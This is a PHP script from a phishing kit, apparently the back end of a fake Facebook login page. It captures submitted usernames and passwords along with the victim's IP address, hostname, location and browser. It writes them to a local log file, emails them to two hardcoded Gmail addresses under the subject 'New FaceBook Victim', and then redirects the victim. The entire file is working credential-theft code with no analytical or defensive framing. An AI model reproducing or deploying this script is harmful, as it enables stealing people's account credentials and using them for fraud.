<?php
include 'ip.php';

if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
    }
$useragent = " User-Agent: ";
$browser = $_SERVER['HTTP_USER_AGENT'];

# Time Of Victim
$date = gmdate ("d-n-Y");

# Time Of Victim
$time = gmdate ("H:i:s");

$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);

$message .= "-------------- 0nline Inf0 -------------------------\n";
$message .= "User        : ".$_POST['username']."\n";
$message .= "Pass        : ".$_POST['password']."\n";
$message .= "---------=IP Address & Date=---------\n";
$message .= "IP          : ".$ip."\n";
$message .= "Log         : $time / $date \n";
$message .= "Port        : $port\n";
$message .= "City        : {$geoplugin->city}\n";
$message .= "Region      : {$geoplugin->region}\n";
$message .= "Country Name: {$geoplugin->countryName}\n";
$message .= "Country Code: {$geoplugin->countryCode}\n";
$message .= "Date        : $adddate\n";
$message .= "User-Agent  : " . $browser . "\n";
$message .= "____________________________________________________\n";
$rnessage = "$message\n";
$TO = "akinola365olaitan@gmail.com";
$TO = "kingsman364@gmail.com";
$send= "akinola365olaitan@gmail.com";
$send= "kingsman364@gmail.com";
$subject = "New FaceBook Victim | $ip";


$file = fopen("Z-LoG_Inf0.txt","ab");
fwrite($file,$message);
fclose($file);

$str=array($send, $IWP); foreach ($str as $send)
if(mail($send,$subject,$rnessage,$headers) != false)
{
mail($Send,$subject,$rnessage,$headers);
}
header("Location: login.html");

?>
